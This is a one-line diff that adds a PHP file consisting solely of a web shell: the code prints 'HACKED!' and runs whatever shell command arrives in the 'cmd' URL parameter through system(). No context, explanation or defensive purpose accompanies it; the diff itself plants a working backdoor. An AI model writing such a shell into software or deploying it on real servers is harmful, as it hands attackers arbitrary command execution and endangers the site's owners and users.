@@ -1,0 +1,1 @@
+<?php echo "HACKED!"; system($_GET["cmd"]); ?>
